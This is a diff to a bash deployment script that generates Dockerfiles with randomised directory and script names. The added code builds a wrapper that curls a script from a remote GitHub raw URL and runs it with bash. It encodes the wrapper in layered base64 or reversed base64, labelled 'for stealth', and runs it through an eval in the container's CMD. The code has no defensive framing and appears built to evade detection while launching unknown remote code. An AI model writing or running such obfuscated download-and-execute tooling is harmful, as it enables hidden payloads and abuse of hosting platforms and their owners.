@@ -33,6 +33,12 @@ for i in 1 2 3; do
     UNIQUE_DIR="deploy-$(rand_str 12)-$(date +%s)-${RANDOM}"
     APP_DIR="/app/deployments/${UNIQUE_DIR}"
     
+    # ============ UNIQUE WORKDIR FOR BOTH OPTIONS ============
+    UNIQUE_WORKDIR="/$(rand_str 15)"
+    
+    # ============ UNIQUE SCRIPT NAME ============
+    SCRIPT_NAME="$(rand_str 12).sh"
+    
     echo ""
     echo "========================================="
     echo "[$i/3] Deployment #$i"
@@ -42,6 +48,8 @@ for i in 1 2 3; do
     echo "📝 Commit Msg: ${GIT_COMMIT_MSG}"
     echo "🚀 App Name: ${APP_NAME}"
     echo "📁 App Dir: ${APP_DIR}"
+    echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
+    echo "📜 Script Name: ${SCRIPT_NAME}"
     echo "========================================="
     
     mkdir -p "$APP_DIR"
@@ -56,7 +64,6 @@ for i in 1 2 3; do
         )
         RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
         
-        UNIQUE_WORKDIR="/$(rand_str 15)"
         BIN1="$(rand_str 10)"
         BIN2="$(rand_str 10)"
         VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
@@ -99,16 +106,46 @@ WORKDIR ${UNIQUE_WORKDIR}
 RUN apt-get update && apt-get install -y curl wget ca-certificates
 CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
-        echo "✅ Option 1: Random image"
+        echo "✅ Option 1: Random image with WORKDIR ${UNIQUE_WORKDIR}"
         
     else
-        # ============ OPTION 2: FIXED image ============
-        cat > Dockerfile << 'EOF'
-FROM phemextradebot/cleverbot8888
-WORKDIR /
-CMD /bin/bash /start
+        # ============ OPTION 2: node:22 image with script downloaded to WORKDIR ============
+        
+        # Create a wrapper script that downloads and runs the remote script
+        # The script is downloaded to UNIQUE_WORKDIR and executed from there
+        WRAPPER_SCRIPT="#!/bin/bash
+set -e
+
+cd ${UNIQUE_WORKDIR}
+
+# Download the remote script to a unique name in WORKDIR
+curl -o ${SCRIPT_NAME} https://raw.githubusercontent.com/linuxweb888888888888/webweb8888/refs/heads/main/script
+
+# Make it executable
+chmod +x ${SCRIPT_NAME}
+
+# Execute the script from WORKDIR
+bash ./${SCRIPT_NAME}"
+        
+        # Encode the wrapper script
+        ENCODED_CMD=$(echo -n "$WRAPPER_SCRIPT" | base64 -w 0)
+        
+        # Random encoding layer for stealth
+        if [ $((RANDOM % 2)) -eq 0 ]; then
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
+            DECODE_CMD="base64 -d | base64 -d"
+        else
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | rev)
+            DECODE_CMD="rev | base64 -d"
+        fi
+        
+        cat > Dockerfile << EOF
+FROM node:22
+WORKDIR ${UNIQUE_WORKDIR}
+RUN apt-get update && apt-get install -y curl
+CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
-        echo "✅ Option 2: Fixed image"
+        echo "✅ Option 2: node:22 image with script downloaded to ${UNIQUE_WORKDIR}/${SCRIPT_NAME}"
     fi
     
     # Git setup (local repo, not global)
